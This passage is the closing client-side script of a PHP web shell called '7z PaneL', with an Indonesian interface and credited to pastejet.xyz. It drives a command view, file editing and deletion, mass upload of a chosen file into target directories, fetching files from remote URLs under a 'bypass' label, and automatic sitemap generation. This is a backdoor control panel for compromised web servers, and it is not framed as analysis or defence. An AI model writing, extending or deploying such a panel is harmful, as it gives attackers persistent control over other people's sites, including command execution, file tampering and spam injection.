            headers: {'Content-Type':'application/x-www-form-urlencoded'},
            body: 'ajax=create_file&dir=' + encodeURIComponent(currentDir) + '&name=' + encodeURIComponent(name)
        }).then(r => r.text()).then(msg => {
            alert(msg);
            loadDir(currentDir);
        });
    }
}

function createFolder() {
    const name = prompt("Nama folder baru:");
    if (name) {
        fetch('', {
            method: 'POST',
            headers: {'Content-Type':'application/x-www-form-urlencoded'},
            body: 'ajax=create_folder&dir=' + encodeURIComponent(currentDir) + '&name=' + encodeURIComponent(name)
        }).then(r => r.text()).then(msg => {
            alert(msg);
            loadDir(currentDir);
        });
    }
}

window.onhashchange = () => {
    const hash = decodeURIComponent(location.hash.slice(1));
    if (hash.startsWith('view=')) loadView('view', hash.slice(5));
    else if (hash.startsWith('edit=')) loadView('edit', hash.slice(5));
    else if (hash.startsWith('rename=')) renameFile(hash.slice(7));
    else if (hash.startsWith('delete=')) deleteFile(hash.slice(7));
    else if (hash.startsWith('deletefolder=')) deleteFolder(hash.slice(13));
    else if (hash.startsWith('renamefolder=')) renameFolder(hash.slice(13));
    else if (hash === 'cmd') loadCmd();
    else if (hash === 'auto_sitemap') loadAutoSitemap();
    else if (hash === 'auto_sitemap2') loadAutoSitemap2();
    else if (hash === 'mass_upload') loadMassUpload();
    else if (hash === 'upload_url') loadUploadUrl();
    else loadDir(hash || '.');
};

function loadMassUpload() {
    const html = `
      <div class="mass-container-left">
        <h2>📤 MassJet Upload</h2>
        <form id="mass-upload-form" onsubmit="doMassUpload(event)" class="mass-form">
            <label>📂 Direktori Target:
                <input type="text" id="mass-dir" value="${currentDir}" required>
            </label>

            <label>📎 Pilih File:
                <input type="file" id="mass-file" required>
            </label>

            <button type="submit">🚀 Crott ah !</button>
        </form>

        <textarea id="mass-result" readonly class="result-box" placeholder="📥 Hasil upload akan muncul di sini..."></textarea>
        <button onclick="copyMassResult()" class="copy-button">📋 Salin Hasil</button>

        <br><br><a href="#${encodeURIComponent(currentDir)}">⬅️ Kembali</a>
      </div>
    `;
    document.getElementById('main-content').innerHTML = html;
}


function doMassUpload(e) {
    e.preventDefault();
    const dir = document.getElementById('mass-dir').value;
    const fileInput = document.getElementById('mass-file');
    if (!fileInput.files[0]) {
        alert("Pilih file terlebih dahulu.");
        return;
    }
    const formData = new FormData();
    formData.append('ajax', 'mass_upload');
    formData.append('uploadto', dir);
    formData.append('file', fileInput.files[0]);

    fetch('', {
        method: 'POST',
        body: formData
    })
    .then(r => r.text())
    .then(text => {
        document.getElementById('mass-result').value = text;
    });
}

function copyMassResult() {
    const result = document.getElementById('mass-result');
    result.select();
    document.execCommand('copy');
    alert('✅ Hasil disalin!');
}

function loadUploadUrl() {
  const html = `
  <div class="upload-url-container">
    <h2>⬆️ UpJet Bypass URL</h2>
    <form onsubmit="submitUploadUrl(event)" class="upload-url-form">
      <label>🌍 URL File:<br>
        <input type="text" name="url" placeholder="https://..." required>
      </label><br>
      <label>📝 Nama File (Opsional):<br>
        <input type="text" name="custom_name" placeholder="contoh.txt">
      </label><br>
      <button type="submit">🚀 Crott ah !</button>
    </form>
    <div id="upload-url-result" class="result-box"></div>
    <br><a href="#${encodeURIComponent(currentDir)}">⬅️ Kembali</a>
  </div>
  `;
  document.getElementById('main-content').innerHTML = html;
}


function submitUploadUrl(e) {
  e.preventDefault();
  const form = e.target;
  const formData = new FormData(form);
  formData.append('ajax', 'upload_url');
  formData.append('dir', currentDir);

  fetch('', {
    method: 'POST',
    body: formData
  })
  .then(res => res.text())
  .then(html => {
    document.getElementById('upload-url-result').innerHTML = html;
  })
  .catch(err => alert("Gagal: " + err));
}


window.onload = () => {
    const hash = decodeURIComponent(location.hash.slice(1));
    if (hash) {
        window.onhashchange();
    } else {
        const initialDir = <?php echo json_encode(__DIR__); ?>;
        loadDir(initialDir);
    }
};

</script>
<footer class="footer-panel">
  <div class="footer-inner">
    <span>🧰 7z PaneL </span> | 
    <span>&copy; <?php echo date('Y'); ?> by <a style="text-decoration:none;" href="https://pastejet.xyz/">www.pastejet.xyz</a></span> | 
    <span>T A B </span>
  </div>
</footer>
</body>
</html>
